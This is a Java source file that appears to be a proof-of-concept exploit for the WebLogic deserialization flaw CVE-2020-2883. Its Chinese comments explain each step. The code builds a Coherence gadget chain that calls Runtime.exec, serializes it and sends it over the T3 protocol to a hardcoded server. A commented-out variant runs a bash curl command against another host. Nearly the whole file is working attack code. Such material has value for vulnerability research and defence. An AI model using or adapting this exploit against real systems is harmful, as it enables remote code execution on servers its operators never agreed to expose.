package com.supeream;


import com.supeream.serial.Reflections;
import com.supeream.serial.Serializables;
import com.supeream.weblogic.T3ProtocolOperation;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/*
 * author:Y4er.com
 *利用链：
 * readObject:797, PriorityQueue (java.util)
 * heapify:737, PriorityQueue (java.util)
 * siftDown:688, PriorityQueue (java.util)
 * siftDownUsingComparator:722, PriorityQueue (java.util)
 * compare:71, ExtractorComparator (com.tangosol.util.comparator)
 * extract:81, ChainedExtractor (com.tangosol.util.extractor)
 * extract:109, ReflectionExtractor (com.tangosol.util.extractor)
 * invoke:498, Method (java.lang.reflect)
 */
/**
 * @author Y4er
 * @modify by ga0weI
 * @work: Exploit cve-2020-2883 vulnerability to attack WebLogic Serve
 */

public class CVE_2020_2883 {

    public static void main(String[] args) throws Exception {
        //1、准备sink点ValueExtractor数组对象
        ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[]{}});
        ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor("invoke", new Object[]{null, new Object[]{}});
        ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"calc"}});
//        ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor("exec", new Object[]{new String[]{"/bin/bash", "-c", "curl http://172.16.1.1/success"}});

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                reflectionExtractor1,
                reflectionExtractor2,
                reflectionExtractor3,
        };
        /*2、为修改ChainedExtractor的m_aExtractor成员成为准备好的valueExtractors对象做准备
            简单提一下，这里为什么不直接赋值，要通过反射最后去赋值，因为后面的优先队列在调用add方法的时候会触发compare方法，
            为了本地重复触发我们准备好PriorityQueue对象之后再去做赋值
         */

        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        /*3、新创建的chainedExtractor用toStirng方法值的vlaueExtractor数组来初始化，
        注意这里我之前也以为随便放点东西就行，或者干脆不放，都可以，反正最后都要被换掉
         其实不然，因为后面在替换之前的PriorityQueue的add方法里面调用了compare方法，当第二次调用add
         也就是有点个元素的时候，如果掉用extract的时候相关方法类型不合适就会抛出异常
        */
        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };
        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);


        //4、创建优先对列PriorityQueue对象，是通过”之前准备好的空的chainedExtractor对象初进行始化的ExtractorComparator对象“来初始化
        //并调用add方法加入两个变量，不然没办法比较
        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("2");
        //5、准备好PriorityQueue对象之后我们再通过上面准备的反射修改方法来修改ChainedExtractor类里面的成员“m_aExtractor”为我们准备用于执行命令的ReflectionExtoractor数组对象
        m_aExtractor.set(chainedExtractor1, valueExtractors);

        //6、其实在其compare方法里面调用extract的时候，其传入的参数是优先队列里面的queue成员数组里面的元素，所以这个通过反射的方法将其queue数组的一个变量变成要用的Runtime.class
        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = Runtime.class;
        queueArray[1] = "1";

        // 7、serialize
        byte[] payload = Serializables.serialize(queue);

        // T3 send, you can also use python weblogic_t3.py test.ser
        T3ProtocolOperation.send("192.168.129.143", "7001", payload);

        // test
        serialize(queueArray);
//        deserialize();

    }

    public static void serialize(Object obj) {
        try {
            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("test.ser"));
            os.writeObject(obj);
            os.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void deserialize() {
        try {
            ObjectInputStream is = new ObjectInputStream(new FileInputStream("test.ser"));
            is.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}